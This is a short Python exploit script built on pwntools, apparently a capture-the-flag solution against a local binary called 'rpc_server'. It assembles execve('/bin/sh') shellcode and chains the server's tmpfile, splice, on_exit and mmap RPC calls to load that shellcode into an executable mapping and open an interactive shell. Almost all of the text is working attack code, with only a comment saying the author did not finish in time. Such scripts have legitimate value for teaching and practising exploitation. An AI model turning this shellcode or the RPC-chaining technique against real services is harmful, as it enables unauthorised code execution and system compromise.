from pwn import *

# Set up pwntools for the correct architecture
exe = "./rpc_server"
context.binary = elf = ELF(exe)
context.log_level = "debug"
context.aslr = False

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    b* main+903
    c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

def rpc(name="", a1 = 0, a2 = 0, a3 = 0, a4 = 0, a5 = 0, a6 = 0):
    sl(f"x:{name} {a1} {a2} {a3} {a4} {a5} {a6}".encode())

r = start()
# r = remote("", )
# Couldnt solve on time. :( but doable.

payload = asm('''
loop:
   mov eax,59
   lea rdi, text[rip]
   xor esi,esi
   xor edx,edx
   syscall
text:
   .ascii "/bin/sh"
''')
#shellcode in the exec region.

rpc("tmpfile", 0, 0, 0, 0, 0, 0)
rpc("splice", 0, 0, 3, 0, len(payload), 0)
sl(payload)
rpc("on_exit", 65536, 1, 0, 0, 0, 0)
rpc("mmap", 65536, 4096, 7, 17, 3, 0)

r.interactive()